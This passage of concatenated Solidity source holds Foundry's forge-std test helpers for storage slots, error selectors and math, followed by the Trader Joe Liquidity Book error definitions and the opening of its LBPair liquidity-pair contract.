abi.decode(parsedDeployData, (RawReceipt));\n        return rawToConvertedReceipt(rawReceipt);\n    }\n\n    function rawToConvertedReceipts(RawReceipt[] memory rawReceipts)\n        internal\n        returns(Receipt[] memory)\n    {\n        Receipt[] memory receipts = new Receipt[](rawReceipts.length);\n        for (uint i; i < rawReceipts.length; i++) {\n            receipts[i] = rawToConvertedReceipt(rawReceipts[i]);\n        }\n        return receipts;\n    }\n\n    function rawToConvertedReceipt(RawReceipt memory rawReceipt)\n        internal\n        returns(Receipt memory)\n    {\n        Receipt memory receipt;\n        receipt.blockHash = rawReceipt.blockHash;\n        receipt.to = rawReceipt.to;\n        receipt.from = rawReceipt.from;\n        receipt.contractAddress = rawReceipt.contractAddress;\n        receipt.effectiveGasPrice = bytesToUint(rawReceipt.effectiveGasPrice);\n        receipt.cumulativeGasUsed= bytesToUint(rawReceipt.cumulativeGasUsed);\n        receipt.gasUsed = bytesToUint(rawReceipt.gasUsed);\n        receipt.status = bytesToUint(rawReceipt.status);\n        receipt.transactionIndex = bytesToUint(rawReceipt.transactionIndex);\n        receipt.blockNumber = bytesToUint(rawReceipt.blockNumber);\n        receipt.logs = rawToConvertedReceiptLogs(rawReceipt.logs);\n        receipt.logsBloom = rawReceipt.logsBloom;\n        receipt.transactionHash = rawReceipt.transactionHash;\n        return receipt;\n    }\n\n    function rawToConvertedReceiptLogs(RawReceiptLog[] memory rawLogs)\n        internal\n        returns (ReceiptLog[] memory)\n    {\n        ReceiptLog[] memory logs = new ReceiptLog[](rawLogs.length);\n        for (uint i; i < rawLogs.length; i++) {\n            logs[i].logAddress = rawLogs[i].logAddress;\n            logs[i].blockHash = rawLogs[i].blockHash;\n            logs[i].blockNumber = bytesToUint(rawLogs[i].blockNumber);\n            logs[i].data = rawLogs[i].data;\n            logs[i].logIndex = bytesToUint(rawLogs[i].logIndex);\n            logs[i].topics = rawLogs[i].topics;\n            logs[i].transactionIndex = bytesToUint(rawLogs[i].transactionIndex);\n            logs[i].transactionLogIndex = bytesToUint(rawLogs[i].transactionLogIndex);\n            logs[i].removed = rawLogs[i].removed;\n        }\n        return logs;\n\n    }\n\n    function bytesToUint(bytes memory b) internal pure returns (uint256){\n            uint256 number;\n            for (uint i=0; i < b.length; i++) {\n                number = number + uint(uint8(b[i]))*(2**(8*(b.length-(i+1))));\n            }\n        return number;\n    }\n\n}\n\n/*//////////////////////////////////////////////////////////////////////////\n                                STD-ERRORS\n//////////////////////////////////////////////////////////////////////////*/\n\nlibrary stdError {\n    bytes public constant assertionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x01);\n    bytes public constant arithmeticError = abi.encodeWithSignature(\"Panic(uint256)\", 0x11);\n    bytes public constant divisionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x12);\n    bytes public constant enumConversionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x21);\n    bytes public constant encodeStorageError = abi.encodeWithSignature(\"Panic(uint256)\", 0x22);\n    bytes public constant popError = abi.encodeWithSignature(\"Panic(uint256)\", 0x31);\n    bytes public constant indexOOBError = abi.encodeWithSignature(\"Panic(uint256)\", 0x32);\n    bytes public constant memOverflowError = abi.encodeWithSignature(\"Panic(uint256)\", 0x41);\n    bytes public constant zeroVarError = abi.encodeWithSignature(\"Panic(uint256)\", 0x51);\n    // DEPRECATED: Use Vm's `expectRevert` without any arguments instead\n    bytes public constant lowLevelError = bytes(\"\"); // `0x`\n}\n\n/*//////////////////////////////////////////////////////////////////////////\n                                STD-STORAGE\n//////////////////////////////////////////////////////////////////////////*/\n\nstruct StdStorage {\n    mapping (address => mapping(bytes4 => mapping(bytes32 => uint256))) slots;\n    mapping (address => mapping(bytes4 =>  mapping(bytes32 => bool))) finds;\n\n    bytes32[] _keys;\n    bytes4 _sig;\n    uint256 _depth;\n    address _target;\n    bytes32 _set;\n}\n\nlibrary stdStorage {\n    event SlotFound(address who, bytes4 fsig, bytes32 keysHash, uint slot);\n    event WARNING_UninitedSlot(address who, uint slot);\n\n    uint256 private constant UINT256_MAX = 115792089237316195423570985008687907853269984665640564039457584007913129639935;\n    int256 private constant INT256_MAX = 57896044618658097711785492504343953926634992332820282019728792003956564819967;\n\n    Vm private constant vm_std_store = Vm(address(uint160(uint256(keccak256('hevm cheat code')))));\n\n    function sigs(\n        string memory sigStr\n    )\n        internal\n        pure\n        returns (bytes4)\n    {\n        return bytes4(keccak256(bytes(sigStr)));\n    }\n\n    /// @notice find an arbitrary storage slot given a function sig, input data, address of the contract and a value to check against\n    // slot complexity:\n    //  if flat, will be bytes32(uint256(uint));\n    //  if map, will be keccak256(abi.encode(key, uint(slot)));\n    //  if deep map, will be keccak256(abi.encode(key1, keccak256(abi.encode(key0, uint(slot)))));\n    //  if map struct, will be bytes32(uint256(keccak256(abi.encode(key1, keccak256(abi.encode(key0, uint(slot)))))) + structFieldDepth);\n    function find(\n        StdStorage storage self\n    )\n        internal\n        returns (uint256)\n    {\n        address who = self._target;\n        bytes4 fsig = self._sig;\n        uint256 field_depth = self._depth;\n        bytes32[] memory ins = self._keys;\n\n        // calldata to test against\n        if (self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))]) {\n            return self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))];\n        }\n        bytes memory cald = abi.encodePacked(fsig, flatten(ins));\n        vm_std_store.record();\n        bytes32 fdat;\n        {\n            (, bytes memory rdat) = who.staticcall(cald);\n            fdat = bytesToBytes32(rdat, 32*field_depth);\n        }\n\n        (bytes32[] memory reads, ) = vm_std_store.accesses(address(who));\n        if (reads.length == 1) {\n            bytes32 curr = vm_std_store.load(who, reads[0]);\n            if (curr == bytes32(0)) {\n                emit WARNING_UninitedSlot(who, uint256(reads[0]));\n            }\n            if (fdat != curr) {\n                require(false, \"stdStorage find(StdStorage): Packed slot. This would cause dangerous overwriting and currently isn't supported.\");\n            }\n            emit SlotFound(who, fsig, keccak256(abi.encodePacked(ins, field_depth)), uint256(reads[0]));\n            self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))] = uint256(reads[0]);\n            self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))] = true;\n        } else if (reads.length > 1) {\n            for (uint256 i = 0; i < reads.length; i++) {\n                bytes32 prev = vm_std_store.load(who, reads[i]);\n                if (prev == bytes32(0)) {\n                    emit WARNING_UninitedSlot(who, uint256(reads[i]));\n                }\n                // store\n                vm_std_store.store(who, reads[i], bytes32(hex\"1337\"));\n                bool success;\n                bytes memory rdat;\n                {\n                    (success, rdat) = who.staticcall(cald);\n                    fdat = bytesToBytes32(rdat, 32*field_depth);\n                }\n\n                if (success && fdat == bytes32(hex\"1337\")) {\n                    // we found which of the slots is the actual one\n                    emit SlotFound(who, fsig, keccak256(abi.encodePacked(ins, field_depth)), uint256(reads[i]));\n                    self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))] = uint256(reads[i]);\n                    self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))] = true;\n                    vm_std_store.store(who, reads[i], prev);\n                    break;\n                }\n                vm_std_store.store(who, reads[i], prev);\n            }\n        } else {\n            require(false, \"stdStorage find(StdStorage): No storage use detected for target.\");\n        }\n\n        require(self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))], \"stdStorage find(StdStorage): Slot(s) not found.\");\n\n        delete self._target;\n        delete self._sig;\n        delete self._keys;\n        delete self._depth;\n\n        return self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))];\n    }\n\n    function target(StdStorage storage self, address _target) internal returns (StdStorage storage) {\n        self._target = _target;\n        return self;\n    }\n\n    function sig(StdStorage storage self, bytes4 _sig) internal returns (StdStorage storage) {\n        self._sig = _sig;\n        return self;\n    }\n\n    function sig(StdStorage storage self, string memory _sig) internal returns (StdStorage storage) {\n        self._sig = sigs(_sig);\n        return self;\n    }\n\n    function with_key(StdStorage storage self, address who) internal returns (StdStorage storage) {\n        self._keys.push(bytes32(uint256(uint160(who))));\n        return self;\n    }\n\n    function with_key(StdStorage storage self, uint256 amt) internal returns (StdStorage storage) {\n        self._keys.push(bytes32(amt));\n        return self;\n    }\n    function with_key(StdStorage storage self, bytes32 key) internal returns (StdStorage storage) {\n        self._keys.push(key);\n        return self;\n    }\n\n    function depth(StdStorage storage self, uint256 _depth) internal returns (StdStorage storage) {\n        self._depth = _depth;\n        return self;\n    }\n\n    function checked_write(StdStorage storage self, address who) internal {\n        checked_write(self, bytes32(uint256(uint160(who))));\n    }\n\n    function checked_write(StdStorage storage self, uint256 amt) internal {\n        checked_write(self, bytes32(amt));\n    }\n\n    function checked_write(StdStorage storage self, bool write) internal {\n        bytes32 t;\n        /// @solidity memory-safe-assembly\n        assembly {\n            t := write\n        }\n        checked_write(self, t);\n    }\n\n    function checked_write(\n        StdStorage storage self,\n        bytes32 set\n    ) internal {\n        address who = self._target;\n        bytes4 fsig = self._sig;\n        uint256 field_depth = self._depth;\n        bytes32[] memory ins = self._keys;\n\n        bytes memory cald = abi.encodePacked(fsig, flatten(ins));\n        if (!self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))]) {\n            find(self);\n        }\n        bytes32 slot = bytes32(self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))]);\n\n        bytes32 fdat;\n        {\n            (, bytes memory rdat) = who.staticcall(cald);\n            fdat = bytesToBytes32(rdat, 32*field_depth);\n        }\n        bytes32 curr = vm_std_store.load(who, slot);\n\n        if (fdat != curr) {\n            require(false, \"stdStorage find(StdStorage): Packed slot. This would cause dangerous overwriting and currently isn't supported.\");\n        }\n        vm_std_store.store(who, slot, set);\n        delete self._target;\n        delete self._sig;\n        delete self._keys;\n        delete self._depth;\n    }\n\n    function read(StdStorage storage self) private returns (bytes memory) {\n        address t = self._target;\n        uint256 s = find(self);\n        return abi.encode(vm_std_store.load(t, bytes32(s)));\n    }\n\n    function read_bytes32(StdStorage storage self) internal returns (bytes32) {\n        return abi.decode(read(self), (bytes32));\n    }\n\n\n    function read_bool(StdStorage storage self) internal returns (bool) {\n        int256 v = read_int(self);\n        if (v == 0) return false;\n        if (v == 1) return true;\n        revert(\"stdStorage read_bool(StdStorage): Cannot decode. Make sure you are reading a bool.\");\n    }\n\n    function read_address(StdStorage storage self) internal returns (address) {\n        return abi.decode(read(self), (address));\n    }\n\n    function read_uint(StdStorage storage self) internal returns (uint256) {\n        return abi.decode(read(self), (uint256));\n    }\n\n    function read_int(StdStorage storage self) internal returns (int256) {\n        return abi.decode(read(self), (int256));\n    }\n\n    function bytesToBytes32(bytes memory b, uint offset) public pure returns (bytes32) {\n        bytes32 out;\n\n        uint256 max = b.length > 32 ? 32 : b.length;\n        for (uint i = 0; i < max; i++) {\n            out |= bytes32(b[offset + i] & 0xFF) >> (i * 8);\n        }\n        return out;\n    }\n\n    function flatten(bytes32[] memory b) private pure returns (bytes memory)\n    {\n        bytes memory result = new bytes(b.length * 32);\n        for (uint256 i = 0; i < b.length; i++) {\n            bytes32 k = b[i];\n            /// @solidity memory-safe-assembly\n            assembly {\n                mstore(add(result, add(32, mul(32, i))), k)\n            }\n        }\n\n        return result;\n    }\n\n\n\n}\n\n\n/*//////////////////////////////////////////////////////////////////////////\n                                STD-MATH\n//////////////////////////////////////////////////////////////////////////*/\n\nlibrary stdMath {\n    int256 private constant INT256_MIN = -57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    function abs(int256 a) internal pure returns (uint256) {\n        // Required or it will fail when `a = type(int256).min`\n        if (a == INT256_MIN)\n            return 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n        return uint256(a > 0 ? a : -a);\n    }\n\n    function delta(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a > b\n            ? a - b\n            : b - a;\n    }\n\n    function delta(int256 a, int256 b) internal pure returns (uint256) {\n        // a and b are of the same sign\n        // this works thanks to two's complement, the left-most bit is the sign bit\n        if ((a ^ b) > -1) {\n            return delta(abs(a), abs(b));\n        }\n\n        // a and b are of opposite signs\n        return abs(a) + abs(b);\n    }\n\n    function percentDelta(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 absDelta = delta(a, b);\n\n        return absDelta * 1e18 / b;\n    }\n\n    function percentDelta(int256 a, int256 b) internal pure returns (uint256) {\n        uint256 absDelta = delta(a, b);\n        uint256 absB = abs(b);\n\n        return absDelta * 1e18 / absB;\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./interfaces/ILBPair.sol\";\n\n/** LBRouter errors */\n\nerror LBRouter__SenderIsNotWAVAX();\nerror LBRouter__PairNotCreated(address tokenX, address tokenY, uint256 binStep);\nerror LBRouter__WrongAmounts(uint256 amount, uint256 reserve);\nerror LBRouter__SwapOverflows(uint256 id);\nerror LBRouter__BrokenSwapSafetyCheck();\nerror LBRouter__NotFactoryOwner();\nerror LBRouter__TooMuchTokensIn(uint256 excess);\nerror LBRouter__BinReserveOverflows(uint256 id);\nerror LBRouter__IdOverflows(int256 id);\nerror LBRouter__LengthsMismatch();\nerror LBRouter__WrongTokenOrder();\nerror LBRouter__IdSlippageCaught(uint256 activeIdDesired, uint256 idSlippage, uint256 activeId);\nerror LBRouter__AmountSlippageCaught(uint256 amountXMin, uint256 amountX, uint256 amountYMin, uint256 amountY);\nerror LBRouter__IdDesiredOverflows(uint256 idDesired, uint256 idSlippage);\nerror LBRouter__FailedToSendAVAX(address recipient, uint256 amount);\nerror LBRouter__DeadlineExceeded(uint256 deadline, uint256 currentTimestamp);\nerror LBRouter__AmountSlippageBPTooBig(uint256 amountSlippage);\nerror LBRouter__InsufficientAmountOut(uint256 amountOutMin, uint256 amountOut);\nerror LBRouter__MaxAmountInExceeded(uint256 amountInMax, uint256 amountIn);\nerror LBRouter__InvalidTokenPath(address wrongToken);\nerror LBRouter__InvalidVersion(uint256 version);\nerror LBRouter__WrongAvaxLiquidityParameters(\n    address tokenX,\n    address tokenY,\n    uint256 amountX,\n    uint256 amountY,\n    uint256 msgValue\n);\n\n/** LBToken errors */\n\nerror LBToken__SpenderNotApproved(address owner, address spender);\nerror LBToken__TransferFromOrToAddress0();\nerror LBToken__MintToAddress0();\nerror LBToken__BurnFromAddress0();\nerror LBToken__BurnExceedsBalance(address from, uint256 id, uint256 amount);\nerror LBToken__LengthMismatch(uint256 accountsLength, uint256 idsLength);\nerror LBToken__SelfApproval(address owner);\nerror LBToken__TransferExceedsBalance(address from, uint256 id, uint256 amount);\n\n/** LBFactory errors */\n\nerror LBFactory__IdenticalAddresses(IERC20 token);\nerror LBFactory__QuoteAssetNotWhitelisted(IERC20 quoteAsset);\nerror LBFactory__QuoteAssetAlreadyWhitelisted(IERC20 quoteAsset);\nerror LBFactory__AddressZero();\nerror LBFactory__LBPairAlreadyExists(IERC20 tokenX, IERC20 tokenY, uint256 _binStep);\nerror LBFactory__LBPairNotCreated(IERC20 tokenX, IERC20 tokenY, uint256 binStep);\nerror LBFactory__DecreasingPeriods(uint16 filterPeriod, uint16 decayPeriod);\nerror LBFactory__BaseFactorOverflows(uint16 baseFactor, uint256 max);\nerror LBFactory__ReductionFactorOverflows(uint16 reductionFactor, uint256 max);\nerror LBFactory__VariableFeeControlOverflows(uint16 variableFeeControl, uint256 max);\nerror LBFactory__BaseFeesBelowMin(uint256 baseFees, uint256 minBaseFees);\nerror LBFactory__FeesAboveMax(uint256 fees, uint256 maxFees);\nerror LBFactory__BinStepRequirementsBreached(uint256 lowerBound, uint16 binStep, uint256 higherBound);\nerror LBFactory__ProtocolShareOverflows(uint16 protocolShare, uint256 max);\nerror LBFactory__FunctionIsLockedForUsers(address user);\nerror LBFactory__FactoryLockIsAlreadyInTheSameState();\nerror LBFactory__LBPairIgnoredIsAlreadyInTheSameState();\nerror LBFactory__BinStepHasNoPreset(uint256 binStep);\nerror LBFactory__SameFeeRecipient(address feeRecipient);\nerror LBFactory__SameFlashLoanFee(uint256 flashLoanFee);\nerror LBFactory__LBPairSafetyCheckFailed(address LBPairImplementation);\nerror LBFactory__SameImplementation(address LBPairImplementation);\nerror LBFactory__ImplementationNotSet();\n\n/** LBPair errors */\n\nerror LBPair__InsufficientAmounts();\nerror LBPair__AddressZero();\nerror LBPair__BrokenSwapSafetyCheck();\nerror LBPair__CompositionFactorFlawed(uint256 id);\nerror LBPair__InsufficientLiquidityMinted(uint256 id);\nerror LBPair__InsufficientLiquidityBurned(uint256 id);\nerror LBPair__WrongLengths();\nerror LBPair__OnlyStrictlyIncreasingId();\nerror LBPair__OnlyFactory();\nerror LBPair__DistributionsOverflow();\nerror LBPair__OnlyFeeRecipient(address feeRecipient, address sender);\nerror LBPair__OracleNotEnoughSample();\nerror LBPair__FlashLoanCallbackFailed();\nerror LBPair__AlreadyInitialized();\nerror LBPair__NewSizeTooSmall(uint256 newSize, uint256 oracleSize);\n\n/** BinHelper errors */\n\nerror BinHelper__BinStepOverflows(uint256 bp);\nerror BinHelper__IdOverflows(int256 id);\nerror BinHelper__IntOverflows(uint256 id);\n\n/** FeeDistributionHelper errors */\n\nerror FeeDistributionHelper__FlashLoanUnderflow(uint256 expectedBalance, uint256 balance);\n\n/** Math128x128 errors */\n\nerror Math128x128__PowerUnderflow(uint256 x, int256 y);\nerror Math128x128__LogUnderflow();\n\n/** Math512Bits errors */\n\nerror Math512Bits__MulDivOverflow(uint256 prod1, uint256 denominator);\nerror Math512Bits__ShiftDivOverflow(uint256 prod1, uint256 denominator);\nerror Math512Bits__MulShiftOverflow(uint256 prod1, uint256 offset);\nerror Math512Bits__OffsetOverflows(uint256 offset);\n\n/** Oracle errors */\n\nerror Oracle__AlreadyInitialized(uint256 _index);\nerror Oracle__LookUpTimestampTooOld(uint256 _minTimestamp, uint256 _lookUpTimestamp);\nerror Oracle__NotInitialized();\n\n/** PendingOwnable errors */\n\nerror PendingOwnable__NotOwner();\nerror PendingOwnable__NotPendingOwner();\nerror PendingOwnable__PendingOwnerAlreadySet();\nerror PendingOwnable__NoPendingOwner();\nerror PendingOwnable__AddressZero();\n\n/** ReentrancyGuardUpgradeable errors */\n\nerror ReentrancyGuardUpgradeable__ReentrantCall();\nerror ReentrancyGuardUpgradeable__AlreadyInitialized();\n\n/** SafeCast errors */\n\nerror SafeCast__Exceeds256Bits(uint256 x);\nerror SafeCast__Exceeds248Bits(uint256 x);\nerror SafeCast__Exceeds240Bits(uint256 x);\nerror SafeCast__Exceeds232Bits(uint256 x);\nerror SafeCast__Exceeds224Bits(uint256 x);\nerror SafeCast__Exceeds216Bits(uint256 x);\nerror SafeCast__Exceeds208Bits(uint256 x);\nerror SafeCast__Exceeds200Bits(uint256 x);\nerror SafeCast__Exceeds192Bits(uint256 x);\nerror SafeCast__Exceeds184Bits(uint256 x);\nerror SafeCast__Exceeds176Bits(uint256 x);\nerror SafeCast__Exceeds168Bits(uint256 x);\nerror SafeCast__Exceeds160Bits(uint256 x);\nerror SafeCast__Exceeds152Bits(uint256 x);\nerror SafeCast__Exceeds144Bits(uint256 x);\nerror SafeCast__Exceeds136Bits(uint256 x);\nerror SafeCast__Exceeds128Bits(uint256 x);\nerror SafeCast__Exceeds120Bits(uint256 x);\nerror SafeCast__Exceeds112Bits(uint256 x);\nerror SafeCast__Exceeds104Bits(uint256 x);\nerror SafeCast__Exceeds96Bits(uint256 x);\nerror SafeCast__Exceeds88Bits(uint256 x);\nerror SafeCast__Exceeds80Bits(uint256 x);\nerror SafeCast__Exceeds72Bits(uint256 x);\nerror SafeCast__Exceeds64Bits(uint256 x);\nerror SafeCast__Exceeds56Bits(uint256 x);\nerror SafeCast__Exceeds48Bits(uint256 x);\nerror SafeCast__Exceeds40Bits(uint256 x);\nerror SafeCast__Exceeds32Bits(uint256 x);\nerror SafeCast__Exceeds24Bits(uint256 x);\nerror SafeCast__Exceeds16Bits(uint256 x);\nerror SafeCast__Exceeds8Bits(uint256 x);\n\n/** TreeMath errors */\n\nerror TreeMath__ErrorDepthSearch();\n\n/** JoeLibrary errors */\n\nerror JoeLibrary__IdenticalAddresses();\nerror JoeLibrary__AddressZero();\nerror JoeLibrary__InsufficientAmount();\nerror JoeLibrary__InsufficientLiquidity();\n\n/** TokenHelper errors */\n\nerror TokenHelper__TransferFailed(IERC20 token, address recipient, uint256 amount);\n\n/** LBQuoter errors */\n\nerror LBQuoter_InvalidLength();\n\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/** Imports **/\n\nimport \"./LBErrors.sol\";\nimport \"./LBToken.sol\";\nimport \"./libraries/BinHelper.sol\";\nimport \"./libraries/Constants.sol\";\nimport \"./libraries/Decoder.sol\";\nimport \"./libraries/FeeDistributionHelper.sol\";\nimport \"./libraries/Math512Bits.sol\";\nimport \"./libraries/Oracle.sol\";\nimport \"./libraries/ReentrancyGuardUpgradeable.sol\";\nimport \"./libraries/SafeCast.sol\";\nimport \"./libraries/SafeMath.sol\";\nimport \"./libraries/SwapHelper.sol\";\nimport \"./libraries/TokenHelper.sol\";\nimport \"./libraries/TreeMath.sol\";\nimport \"./interfaces/ILBFlashLoanCallback.sol\";\nimport \"./interfaces/ILBPair.sol\";\n\n/// @title Liquidity Book Pair\n/// @author Trader Joe\n/// @notice The implementation of Liquidity Book Pair that also acts as the receipt token for liquidity positions\ncontract LBPair is LBToken, ReentrancyGuardUpgradeable, ILBPair {\n    /** Libraries **/\n\n    using Math512Bits for uint256;\n    using TreeMath for mapping(uint256 => uint256)[3];\n    using SafeCast for uint256;\n    using SafeMath for uint256;\n    using TokenHelper for IERC20;\n    using FeeHelper for FeeHelper.FeeParameters;\n    using SwapHelper for Bin;\n    using Decoder for bytes32;\n    using FeeDistributionHelper for FeeHelper.FeesDistribution;\n    using Oracle for bytes32[65_535];\n\n    /** Modifiers **/\n\n    modifier onlyFactory() {\n        if (msg.sender != address(factory)) revert LBPair__OnlyFactory();\n        _;\n    }\n\n    /** Public immutable variables **/\n\n    ILBFactory public immutable override factory;\n\n    /** Public variables **/\n\n    IERC20 public override tokenX;\n    IERC20 public override tokenY;\n\n    /** Private variables **/\n\n    PairInformation private _pairInformation;\n    FeeHelper.FeeParameters private _feeParameters;\n    /// @dev The reserves of tokens for every bin. This is the amount\n    /// of tokenY if `id < _pairInformation.activeId`; of tokenX if `id > _pairInformation.activeId`\n    /// and a mix of both if `id == _pairInformation.activeId`\n    mapping(uint256 => Bin) private _bins;\n    /// @dev Tree to find bins with non zero liquidity\n    mapping(uint256 => uint256)[3] private _tree;\n    /// @dev Mapping from account to user's unclaimed fees. The first 128 bits are tokenX and the last are for tokenY\n    mapping(address => bytes32) private _unclaimedFees;\n    /// @dev Mapping from account to id to user's accruedDebt.\n    mapping(address => mapping(uint256 => Debts)) private _accruedDebts;\n    /// @dev Oracle array\n    bytes32[65_535] private _oracle;\n\n    /** OffSets */\n\n    uint256 private constant _OFFSET_PAIR_RESERVE_X = 24;\n    uint256 private constant _OFFSET_PROTOCOL_FEE = 128;\n    uint256 private constant _OFFSET_BIN_RESERVE_Y = 112;\n    uint256 private constant _OFFSET_VARIABLE_FEE_PARAMETERS = 144;\n    uint256 private constant _OFFSET_ORACLE_SAMPLE_LIFETIME = 136;\n    uint256 private constant _OFFSET_ORACLE_SIZE = 152;\n    uint256 private constant _OFFSET_ORACLE_ACTIVE_SIZE = 168;\n    uint256 private constant _OFFSET_ORACLE_LAST_TIMESTAMP = 184;\n    uint256 private constant _OFFSET_ORACLE_ID = 224;\n\n    /** Constructor **/\n\n    /// @notice Set the factory address\n    /// @param _factory The address of the factory\n    constructor(ILBFactory _factory) LBToken() {\n        if (address(_factory) == address(0)) revert LBPair__AddressZero();\n        factory = _factory;\n    }\n\n    /// @notice Initialize the parameters of the LBPair\n    /// @dev The different parameters needs to be validated very cautiously.\n    /// It is highly recommended to never call this function directly, use the factory\n    /// as it validates the different parameters\n    /// @param _tokenX The address of the tokenX. Can't be address 0\n    /// @param _tokenY The address of the tokenY. Can't be address 0\n    /// @param _activeId The active id of the pair\n    /// @param _sampleLifetime The lifetime of a sample. It's the min time between 2 oracle's sample\n    /// @param _packedFeeParameters The fee parameters packed in a single 256 bits slot\n    function initialize(\n        IERC20 _tokenX,\n        IERC20 _tokenY,\n        uint24 _activeId,\n        uint16 _sampleLifetime,\n        bytes32 _packedFeeParameters\n    ) external override onlyFactory {\n        if (address(_tokenX) == address(0) || address(_tokenY) == address(0)) revert LBPair__AddressZero();\n        if (address(tokenX) != address(0)) revert LBPair__AlreadyInitialized();\n\n        __ReentrancyGuard_init();\n\n        tokenX = _tokenX;\n        tokenY = _tokenY;\n\n        _pairInformation.activeId = _activeId;\n        _pairInformation.oracleSampleLifetime = _sampleLifetime;\n\n        _setFeesParameters(_packedFeeParameters);\n        _increaseOracle(2);\n    }\n\n    /** External View Functions **/\n\n    /// @notice View function to get the reserves and active id\n    /// @return reserveX The reserve of asset X\n    /// @return reserveY The reserve of asset Y\n    /// @return activeId The active id of the pair\n    function getReservesAndId()\n        external\n        view\n        override\n        returns (\n            uint256 reserveX,\n            uint256 reserveY,\n            uint256 activeId\n        )\n    {\n        return _getReservesAndId();\n    }\n\n    /// @notice View function to get the global fees information, the total fees and those for protocol\n    /// @dev The fees for users are `total - protocol`\n    /// @return feesXTotal The total fees of asset X\n    /// @return feesYTotal The total fees of asset Y\n    /// @return feesXProtocol The protocol fees of asset X\n    /// @return feesYProtocol The protocol fees of asset Y\n    function getGlobalFees()\n        external\n        view\n        override\n        returns (\n            uint256 feesXTotal,\n            uint256 feesYTotal,\n            uint256 feesXProtocol,\n            uint256 feesYProtocol\n        )\n    {\n        return _getGlobalFees();\n    }\n\n    /// @notice View function to get the oracle parameters\n    /// @return oracleSampleLifetime The lifetime of a sample, it accumulates information for up to this timestamp\n    /// @return oracleSize The size of the oracle (last ids can be empty)\n    /// @return oracleActiveSize The active size of the oracle (no empty data)\n    /// @return oracleLastTimestamp The timestamp of the creation of the oracle's latest sample\n    /// @return oracleId The index of the oracle's latest sample\n    /// @return min The min delta time of two samples\n    /// @return max The safe max delta time of two samples\n    function getOracleParameters()\n        external\n        view\n        override\n        returns (\n            uint256 oracleSampleLifetime,\n            uint256 oracleSize,\n            uint256 oracleActiveSize,\n            uint256 oracleLastTimestamp,\n            uint256 oracleId,\n            uint256 min,\n            uint256 max\n        )\n    {\n        (oracleSampleLifetime, oracleSize, oracleActiveSize, oracleLastTimestamp, oracleId) = _getOracleParameters();\n        min = oracleActiveSize == 0 ? 0 : oracleSampleLifetime;\n        max = oracleSampleLifetime * oracleActiveSize;\n    }\n\n    /// @notice View function to get the oracle's sample at `_timeDelta` seconds\n    /// @dev Return a linearized sample, the weighted average of 2 neighboring samples\n    /// @param _timeDelta The number of seconds before the current timestamp\n    /// @return cumulativeId The weighted average cumulative id\n    /// @return cumulativeVolatilityAccumulated The weighted average cumulative volatility accumulated\n    /// @return cumulativeBinCrossed The weighted average cumulative bin crossed\n    function getOracleSampleFrom(uint256 _timeDelta)\n        external\n        view\n        override\n        returns (\n            uint256 cumulativeId,\n            uint256 cumulativeVolatilityAccumulated,\n            uint256 cumulativeBinCrossed\n        )\n    {\n        uint256 _lookUpTimestamp = block.timestamp - _timeDelta;\n\n        (, , uint256 _oracleActiveSize, , uint256 _oracleId) = _getOracleParameters();\n\n        uint256 timestamp;\n        (timestamp, cumulativeId, cumulativeVolatilityAccumulated, cumulativeBinCrossed) = _oracle.getSampleAt(\n            _oracleActiveSize,\n            _oracleId,\n            _lookUpTimestamp\n        );\n\n        if (timestamp < _lookUpTimestamp) {\n            FeeHelper.FeeParameters memory _fp = _feeParameters;\n            uint256 _activeId = _pairInformation.activeId;\n            _fp.updateVariableFeeParameters(_activeId);\n\n            unchecked {\n                uint256 _deltaT = _lookUpTimestamp - timestamp;\n\n                cumulativeId += _activeId * _deltaT;\n                cumulativeVolatilityAccumulated += uint256(_fp.volatilityAccumulated) * _deltaT;\n            }\n        }\n    }\n\n    /// @notice View function to get the fee parameters\n    /// @return The fee parameters\n    function feeParameters() external view override returns (FeeHelper.FeeParameters memory) {\n        return _feeParameters;\n    }\n\n    /// @notice View function to get the first bin that isn't empty, will not be `_id` itself\n    /// @param _id The bin id\n    /// @param _swapForY Whether you've swapping token X for token Y (true) or token Y for token X (false)\n    /// @return The id of the non empty bin\n    function findFirstNonEmptyBinId(uint24 _id, bool _swapForY) external view override returns (uint24) {\n        return _tree.findFirstBin(_id, _swapForY);\n    }\n\n    /// @notice View function to get the bin at `id`\n    /// @param _id The bin id\n    /// @return reserveX The reserve of tokenX of the bin\n    /// @return reserveY The reserve of tokenY of the bin\n    function getBin(uint24 _id) external view override returns (uint256 reserveX, uint256 reserveY) {\n        return _getBin(_id);\n    }\n\n    /// @notice View function to get the pending fees of a user\n    /// @dev The array must be strictly increasing to ensure uniqueness\n    /// @param _account The address of the user\n    /// @param _ids The list of ids\n    /// @return amountX The amount of tokenX pending\n    /// @return amountY The amount of tokenY pending\n    function pendingFees(address _account, uint256[] memory _ids)\n        external\n        view\n        override\n        returns (uint256 amountX, uint256 amountY)\n    {\n        bytes32 _unclaimedData = _unclaimedFees[_account];\n\n        amountX = _unclaimedData.decode(type(uint128).max, 0);\n        amountY = _unclaimedData.decode(type(uint128).max, 128);\n\n        uint256 _lastId;\n        unchecked {\n            for (uint256 i; i < _ids.length; ++i) {\n                uint256 _id = _ids[i];\n\n                // Ensures uniqueness of ids\n                if (_lastId >= _id && i != 0) revert LBPair__OnlyStrictlyIncreasingId();\n\n                uint256 _balance = balanceOf(_account, _id);\n\n                if (_balance != 0) {\n                    Bin memory _bin = _bins[_id];\n\n                    (uint256 _amountX, uint256 _amountY) = _getPendingFees(_bin, _account, _id, _balance);\n\n                    amountX += _amountX;\n                    amountY += _amountY;\n                }\n\n                _lastId = 